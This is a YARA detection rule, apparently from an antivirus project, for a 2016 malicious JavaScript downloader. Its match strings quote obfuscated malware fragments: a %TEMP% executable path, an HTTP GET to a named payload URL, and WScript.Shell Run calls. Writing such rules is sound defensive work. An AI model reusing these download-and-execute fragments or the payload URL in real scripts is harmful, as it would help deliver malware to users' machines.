rule sig_20160329_420488e4321db01776654523ecdeab9d {
  meta:
    description = "datamaliciousorder - file 20160329_420488e4321db01776654523ecdeab9d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c46e000c6fd66e37155ed6ee4b5f9ad8b7c41a1946242abd349b7b24d25dff8f"

  strings:
    $s1  = "function Vagnm() {return Tiimkqoge[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"ohfCBkRt4SNkOcF.exe\";};" fullword ascii
    $s2  = "Yywhnxgpk[Zzmqpmlll](\"GET\", \"http://portal.ofar.com.br/o4psaf\", false);" fullword ascii
    $s3  = "do {WScript[Vfmatqzt](Feptk() * 11)} while (Yywhnxgpk[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Tiimkqoge = function Hdflp() {return WScript[Dfuicsix](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Oxgsccl(Evnmdmjswy, Qhbjnzje){return Evnmdmjswy - Qhbjnzje;};" fullword ascii
    $s6  = "function Nyvxncfrdi() {return ((Vzvhk == true) && (Vzvhk == Lisufbagnv)) ? 1 : Iotazfxn;};" fullword ascii
    $s7  = "function Ocodlm(Gnyvzkgjfa){Tiimkqoge[\"Run\"](Gnyvzkgjfa, Iotazfxn, Iotazfxn);};" fullword ascii
    $s8  = "Lisufbagnv = true; " fullword ascii
    $s9  = "return Oxgsccl(Rhcobgndcq, Hbrml);" fullword ascii
    $s10 = "function Uetkdxznin(){return Dfuicsix;};" fullword ascii
    $s11 = "var Uujqxsy = false;" fullword ascii
    $s12 = "var Lisufbagnv = false;" fullword ascii
    $s13 = "function Feptk(){return 22;};" fullword ascii
    $s14 = "function Jibsyatw(Mgcnpryvz) {var Waqqwnohlb = (1, 2, 3, 4, 5, Mgcnpryvz); return Waqqwnohlb;};" fullword ascii
    $s15 = " while (Zmrxmhez){" fullword ascii
    $s16 = "var Dahahunjp = new this[\"Date\"]();" fullword ascii
    $s17 = "function Khxowa()" fullword ascii
    $s18 = "var Vzvhk = false;" fullword ascii
    $s19 = "Vzvhk = true; " fullword ascii
    $s20 = "function Kxvciy(){return Svjivl;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}